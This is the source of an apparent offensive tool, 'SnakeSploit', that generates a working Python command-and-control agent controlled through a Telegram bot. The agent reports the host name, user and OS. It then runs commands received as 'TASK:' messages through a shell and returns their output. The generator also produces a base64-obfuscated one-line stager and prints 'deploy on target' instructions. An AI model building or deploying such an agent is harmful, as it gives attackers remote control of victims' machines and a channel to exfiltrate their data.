"""
SnakeSploit Telegram Agent Generator — creates a standalone C2 agent
that uses Telegram for command and control.

Usage:
  snakesploit --make-telegram-agent
  snakesploit > make_telegram_agent
"""

import base64
import os
import sys
from datetime import datetime


AGENT_TEMPLATE = '''import json,os,socket,subprocess,sys,time,urllib.request,urllib.parse

BOT_TOKEN = "{token}"
API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
CHAT_ID = None
POLL = 5

def tg(method, params=None):
    url = API_BASE + "/" + method
    data = urllib.parse.urlencode(params or {{}}).encode()
    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode())
    except:
        return None

# Get host info
try:
    hostname = socket.gethostname()
except:
    hostname = "unknown"
try:
    os_name = sys.platform
except:
    os_name = "unknown"
try:
    user = os.getlogin()
except:
    user = "unknown"

# Check-in
me = tg("getMe")
if not me or not me.get("ok"):
    print("[-] Invalid bot token")
    sys.exit(1)

print("[*] Telegram C2 Agent starting...")
print("[*] Bot: @" + me["result"]["username"])

# Get our chat ID by sending a message
msg = tg("sendMessage", {{"chat_id": 0, "text": "CHECKIN:" + hostname + "|" + user + "|" + os_name}})
if msg and msg.get("ok"):
    CHAT_ID = msg["result"]["chat"]["id"]
    print("[+] Registered. Chat ID: " + str(CHAT_ID))
else:
    # Try to get chat ID from updates
    updates = tg("getUpdates", {{"timeout": 5}})
    if updates and updates.get("ok") and updates.get("result"):
        for u in updates["result"]:
            msg2 = u.get("message", {{}})
            if msg2.get("text", "").startswith("/start"):
                CHAT_ID = msg2["chat"]["id"]
                print("[+] Got chat ID from /start: " + str(CHAT_ID))
                break

if not CHAT_ID:
    print("[-] Could not get chat ID. Send /start to your bot first.")
    sys.exit(1)

last_id = 0

while True:
    try:
        up = tg("getUpdates", {{"offset": last_id + 1, "timeout": 10}})
        if up and up.get("ok"):
            for u in up.get("result", []):
                if u.get("update_id", 0) > last_id:
                    last_id = u["update_id"]
                m = u.get("message", {{}})
                text = (m.get("text") or "").strip()
                if text.upper().startswith("TASK:"):
                    cmd = text[5:].strip()
                    print("[*] Running: " + cmd)
                    try:
                        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                        out = r.stdout + r.stderr
                        if not out:
                            out = "[OK]"
                    except subprocess.TimeoutExpired:
                        out = "[TIMEOUT]"
                    except Exception as e:
                        out = "[ERR] " + str(e)
                    tg("sendMessage", {{"chat_id": CHAT_ID, "text": "RESULT:" + out[:500]}})
    except:
        pass
    time.sleep(POLL)
'''


def generate_agent(bot_token: str, output_path: str = None) -> str:
    """Generate a standalone Telegram C2 agent script."""
    if not output_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.expanduser("~/snakesploit_telegram_agent_%s.py" % ts)

    code = AGENT_TEMPLATE.format(token=bot_token)

    # Also create an obfuscated (base64) version
    b64_code = base64.b64encode(code.encode()).decode()
    stager = "python3 -c \"exec(__import__('base64').b64decode('%s').decode())\"" % b64_code

    with open(output_path, "w") as f:
        f.write(code)
    os.chmod(output_path, 0o755)

    return output_path, stager


def main():
    print("""
╔══════════════════════════════════════╗
║   SnakeSploit Telegram Agent Gen    ║
╚══════════════════════════════════════╝
""")
    token = input("Enter your Telegram bot token: ").strip()
    if not token:
        print("  [-] No token provided.")
        return

    path, stager = generate_agent(token)

    print("  [+] Agent script saved to: %s" % path)
    print("  [+] Size: %d bytes" % os.path.getsize(path))
    print()
    print("  [*] Deploy on target:")
    print("      python3 %s" % path)
    print()
    print("  [*] One-liner stager (no file needed):")
    print("      %s" % stager)
    print()
    print("  [*] Send commands via Telegram to your bot.")
    print("      Prefix commands with TASK: e.g. 'TASK:whoami'")


if __name__ == "__main__":
    main()